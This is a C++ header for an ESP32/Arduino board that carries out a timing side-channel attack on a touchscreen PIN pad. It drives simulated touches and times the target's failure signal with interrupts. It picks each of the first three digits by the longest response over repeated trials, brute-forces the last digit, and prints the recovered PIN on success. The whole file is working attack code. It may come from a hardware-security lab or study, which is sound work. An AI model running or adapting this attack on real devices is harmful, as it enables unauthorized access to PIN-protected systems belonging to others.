#pragma once

#include <Arduino.h>
#include <Wire.h> 
#include "touchHandle.h"
#include "StopWatch.h"

#define FAIL_PIN GPIO_NUM_27
#define FAIL_PIN2 12
#define SUCCESS_PIN 14
#define NUM_OF_ITERAIONS 20
#define PASS_SIZE 4 

namespace TSCA {
    const float PROGRESS_INTERVAL = 100.0 / (NUM_OF_ITERAIONS * (PASS_SIZE-1) * 10);
    
    typedef enum {NOTHING, FINISHED_BATCH, SUCCESS, FAIL, INC, FOUND_I2C} EventType_t;
    EventType_t eventState = NOTHING;
    float progress = 0;

    bool finish = false;
    TaskHandle_t tftTaskHandle = NULL;

    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock);

    void theEnd();

    uint8_t pass[PASS_SIZE];

    void TSCALoop(void* arg) {
        pinMode(FAIL_PIN, INPUT);
        pinMode(SUCCESS_PIN, INPUT);
        
        // Attach interrupts
        attachInterrupt(digitalPinToInterrupt(FAIL_PIN), StopWatch::stopTimer, RISING);
        attachInterrupt(digitalPinToInterrupt(SUCCESS_PIN), theEnd, RISING);

        delay(10);

        // Initialize the timer
        StopWatch::init();

        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
        eventState = NOTHING;
        log_d("start");
        delay(3000);
        Touch::reset();
        Touch::relaese();
        delay(1500);
        if (tftTaskHandle != NULL) {
            log_d("calling tft");
            eventState = FOUND_I2C;
            xTaskNotifyGive(tftTaskHandle);
        }
        const uint8_t initPass[PASS_SIZE] = {0,0,0,0};
        // generate the password each loop iteration
        for(;;){
            memcpy(pass, initPass, PASS_SIZE);

            for (uint8_t index = 0; index < PASS_SIZE-1; index++)
            {
                uint16_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
                uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
                for (uint32_t i = 0; i < NUM_OF_ITERAIONS; i++){
                    uint64_t max_time = 0;
                    for (uint8_t j = 0; j < 10; j++)
                    {
                        pass[index] = j;
                        results[j] = sendPassword(pass, (SemaphoreHandle_t*)arg);
                        if(results[j] > max_time)
                            max_time = results[j];
                        progress += PROGRESS_INTERVAL;
                        if (tftTaskHandle != NULL) {
                            TSCA::eventState = INC;
                            xTaskNotifyGive(tftTaskHandle);
                        }
                        /*for (int i = 0; i < 10; i++) {
                            Serial.print(results[i]);
                            Serial.print(" ");
                        }
                        Serial.println();*/
                    }
                    for (uint8_t j = 0; j < 10; j++)
                        if(results[j] == max_time)
                            maxes[j]++;
                }
                for (int i = 0; i < 10; i++) {
                    Serial.print(maxes[i]);
                    Serial.print(" ");
                }
                Serial.println();
                for (int i = 0; i < 10; i++) {
                    Serial.print(results[i]);
                    Serial.print(" ");
                }
                Serial.println();
                
                uint16_t max = 0;
                uint16_t maxval = 0;
                for (uint8_t j = 0; j < 10; j++)
                    if(maxes[j] > maxval){
                        max = j;
                        maxval = maxes[j];
                    }
                pass[index] = max;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = FINISHED_BATCH;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            for (uint8_t j = 0; j < 10; j++)
            {
                pass[PASS_SIZE-1] = j;
                sendPassword(pass, (SemaphoreHandle_t*)arg);
                progress += PROGRESS_INTERVAL*NUM_OF_ITERAIONS;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = INC;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            progress = 0;
            if (tftTaskHandle != NULL) {
                TSCA::eventState = FAIL;
                xTaskNotifyGive(tftTaskHandle);
            }
        }
    }

    //================================================================================================

    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock)
    {
        for (uint8_t i = 0; i < PASS_SIZE; i++){
            Touch::touch(password[i]);
            Touch::relaese();
        }

        Touch::enter();

        return StopWatch::wait();
    }

    void theEnd() {
        if (Touch::state == ENTER_BUTTON) {
            detachInterrupt(SUCCESS_PIN);
            detachInterrupt(FAIL_PIN);
            Serial.println("The End");
            TSCA::eventState = SUCCESS;
            xTaskNotifyGive(tftTaskHandle);
            for (size_t i = 0; i < PASS_SIZE; i++) {
                Serial.print(pass[i]);
            }
            vTaskDelete(NULL);
        }
    }
}